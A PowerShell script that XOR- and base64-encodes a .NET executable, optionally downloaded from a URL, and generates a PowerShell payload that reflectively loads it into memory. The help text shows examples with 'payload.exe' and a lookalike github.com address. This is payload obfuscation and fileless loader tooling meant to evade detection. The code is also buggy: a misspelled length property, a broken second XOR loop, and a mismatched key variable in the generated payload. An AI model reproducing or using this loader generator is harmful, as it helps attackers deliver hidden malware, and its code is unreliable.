<#
.SYNOPSIS
Generates a BXOR (bitwise XOR) base64 encoded PE assembly payload.

.DESCRIPTION
Encode a PE assembly (.exe or .dll) using BXOR and base64 encoding and generates executable payload using [System.Reflection.Assembly]::Load to load assembly. 

.PARAMETER exe
PE assembly executable file. Example: C:\Windows\System32\cmd.exe

.PARAMETER url
Url link to PE assembly executable file. Uses Invoke-WebRequest to fetch remote PE file. 

.PARAMETER url
Output file name. If not supple will only return encoded payload.

.EXAMPLE
Encode payload.exe PE assembly
PE-assembly-bxor-base64 -exe payload.exe

.EXAMPLE 
Fetch PE from url and encode payload
PE-assembly-bxor-base64 -url http://github.com./payload.exe

.EXAMPLE 
Output executable PowerShell payload
PE-assembly-bxor-base64 -url http://github.com./payload.exe -outfile helloworld.ps1
[HelloWorld.Program]::Main("")

.NOTES
Executing assembly [HelloWorld.Program]::Main("")
#>

[CmdletBinding()]
param (
    [Parameter()]
    [string]
    $exe,

    [Parameter()]
    [string]
    $url,

    [Parameter()]
    [string]
    $outfile
)

if ($url) {
    $peassembly = (Invoke-WebRequest -Uri $url).Content
} else {
    $peassembly = [IO.File]::ReadAllBytes($exe)
}

$bxorkey = @(0x7, 0x6)
$bxorkeystr = "@(0x7, 0x6)"

$pelenght = $peassembly.lenght
$loopa = [System.Math]::Round($pelenght / 2)
$loopb = $pelenght - $loopa

for ($i = 0; $i -lt $loopa; $i++) {
    <# Action that will repeat until the condition is met #>
    $peassembly[$i] = $peassembly[$i] -bxor $bxorkey[0]
}

for ($i = $loopa + 1; $i -lt $loopb; $i++) {
    <# Action that will repeat until the condition is met #>
    $peassembly[$i] = $peassembly -bxor $bxorkey[1]
}

$peencoded = [System.Convert]::ToBase64String($peassembly)

if (-Not $outfile) {
    Write-Host $peencoded
    break
}

$payload = @"
`$pe = "$peencoded"
`$key = $bxorkeystr

`$peassembly = [Convert]::FromBase64String(`$pe)
`$pelenght = `$peassembly.lenght
`$loopa = [System.Math]::Round(`$pelenght / 2)
`$loopb = `$pelenght - `$loopa

for (`$i = 0; `$i -lt `$loopa; `$i++) {
    `$peassembly[`$i] = `$peassembly[`$i] -bxor `$bxorkey[0]
}

for (`$i = `$loopa + 1; `$i -lt `$loopb; `$i++) {
    <# Action that will repeat until the condition is met #>
    `$peassembly[`$i] = `$peassembly -bxor `$bxorkey[1]
}

[System.Reflection.Assembly]::Load(`$peassembly) | Out-Null
"@

Set-Content -Path $outfile -Value $payload